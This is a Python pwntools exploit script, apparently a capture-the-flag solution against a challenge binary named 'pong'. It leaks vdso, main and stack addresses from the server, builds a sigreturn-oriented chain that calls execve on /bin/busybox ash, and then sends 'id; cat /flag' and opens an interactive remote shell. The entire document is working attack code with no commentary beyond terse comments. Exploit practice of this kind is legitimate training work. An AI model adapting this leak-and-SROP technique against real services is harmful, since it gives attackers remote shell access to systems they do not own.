#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
import psutil

context.update(arch="amd64",os="linux")
context.log_level = 'info'

exe = ELF('pong')

def get_pid_by_name(process_name):
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == process_name:
            return process.info['pid']
    return None


if args.REMOTE:
  host, port = "flu.xxx", "10060"
else:
  host, port = "127.0.0.1", "1440"

# connect to server
p = remote(host,port)
if not args.REMOTE:
  pause()

p.send('A')
buff = p.recv(0x200)
print(hexdump(buff))

# well offsets are bit different between docker and remote 
if args.REMOTE:
  vdso = u64(buff[0x78:0x80])
else:
  vdso = u64(buff[0x80:0x88])
print('vdso address = '+hex(vdso))

if args.REMOTE:
  main = u64(buff[0x108:0x110])
else:
  main = u64(buff[0x120:0x128])
print('main address = '+hex(main))

if args.REMOTE:
  stack = u64(buff[0x168:0x170])
else:
  stack = u64(buff[0x180:0x188])
print('stack address = '+hex(stack))

gadget1 = main+0x3c	# inc eax gadget
syscall_ret = main+0x36	# syscall

# offset to command string on stack
if args.REMOTE:
  offset = 0x249-16
else:
  offset = 0x249

fname = b'/bin/busybox\x00'.ljust(16, b'\x00')
binshstr = stack-(offset+8)

arg1_addr = binshstr+16
arg1 = b'ash\x00'.ljust(8,b'\x00')

frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 59
frame.rdi = binshstr
frame.rsi = arg1_addr+8
frame.rdx = 0
frame.rsp = stack-9
frame.rip = syscall_ret
frame = bytes(frame)

for i in range(3):
  payload = p64(gadget1)*15+p64(syscall_ret)+frame+ fname+ arg1 + p64(arg1_addr)+ p64(0)
  print('payload size = '+str(len(payload)))
  p.send(payload)
  buff = p.recv(0x200)

p.sendline("id; cat /flag")

p.interactive()

